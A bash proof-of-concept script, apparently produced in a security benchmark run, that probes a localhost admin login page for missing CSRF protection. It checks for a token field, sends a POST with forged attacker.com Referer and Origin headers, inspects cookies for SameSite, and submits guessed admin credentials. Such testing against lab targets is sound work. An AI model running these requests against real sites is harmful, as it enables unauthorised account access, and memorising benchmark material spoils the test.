#!/bin/bash
# POC: Demonstrates CSRF vulnerability on admin login form by crafting cross-origin POST request without CSRF token validation
# Target: ./repo
# Created: 2025-11-07T21:43:14.130Z
# Session: benchmark-XBEN-078-24-mhpdbdxp

# CSRF Vulnerability POC - Admin Login Form
# This script demonstrates the lack of CSRF protection on the admin login form

TARGET_URL="http://localhost:8080/admin.php"
ATTACKER_URL="http://attacker.com/csrf-page"

echo "========================================"
echo "CSRF POC - Admin Login Form"
echo "========================================"
echo ""

# Test 1: Check for CSRF token in the login form
echo "[*] Test 1: Checking for CSRF token in admin login form..."
FORM_HTML=$(curl -s "$TARGET_URL")

if echo "$FORM_HTML" | grep -i "csrf\|_token\|authenticity_token" > /dev/null; then
    echo "[!] CSRF token found in form"
    echo "$FORM_HTML" | grep -i "csrf\|_token\|authenticity_token"
else
    echo "[+] VULNERABLE: No CSRF token field detected in login form"
fi
echo ""

# Test 2: Attempt cross-origin POST without CSRF token
echo "[*] Test 2: Sending cross-origin POST request (simulating CSRF attack)..."
echo "    - Using Referer header: $ATTACKER_URL"
echo "    - Using Origin header: http://attacker.com"
echo ""

CSRF_TEST=$(curl -s -X POST "$TARGET_URL" \
    -d "username=testadmin&password=testpass" \
    -H "Referer: $ATTACKER_URL" \
    -H "Origin: http://attacker.com" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -w "\n%{http_code}" \
    -c /tmp/cookies.txt)

HTTP_CODE=$(echo "$CSRF_TEST" | tail -n 1)
RESPONSE=$(echo "$CSRF_TEST" | head -n -1)

echo "[*] HTTP Response Code: $HTTP_CODE"
echo ""

if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "301" ]; then
    echo "[+] VULNERABLE: Cross-origin POST request accepted (HTTP $HTTP_CODE)"
    echo "    The application did not reject the request based on Referer/Origin headers"
else
    echo "[-] Request was rejected with HTTP $HTTP_CODE"
fi
echo ""

# Test 3: Check for SameSite cookie attribute
echo "[*] Test 3: Checking session cookie SameSite attributes..."
if [ -f /tmp/cookies.txt ]; then
    COOKIES=$(cat /tmp/cookies.txt)
    echo "$COOKIES"
    echo ""
    
    if echo "$COOKIES" | grep -i "samesite" > /dev/null; then
        echo "[*] SameSite attribute found"
        echo "$COOKIES" | grep -i "samesite"
    else
        echo "[+] VULNERABLE: No SameSite attribute on session cookies"
        echo "    Cookies are transmitted in cross-site requests"
    fi
else
    echo "[-] Could not retrieve cookies"
fi
echo ""

# Test 4: Verify form accepts requests without token
echo "[*] Test 4: Verifying form can be submitted without any CSRF token..."
RESULT=$(curl -s -X POST "$TARGET_URL" \
    -d "username=admin&password=password" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -w "\n%{http_code}")

RESULT_CODE=$(echo "$RESULT" | tail -n 1)
if [ "$RESULT_CODE" = "200" ] || [ "$RESULT_CODE" = "302" ] || [ "$RESULT_CODE" = "301" ]; then
    echo "[+] VULNERABLE: Form submitted successfully without any CSRF token"
    echo "    HTTP Status: $RESULT_CODE"
else
    echo "[-] Form rejected the request (HTTP $RESULT_CODE)"
fi
echo ""

echo "========================================"
echo "CSRF Vulnerability Confirmed"
echo "========================================"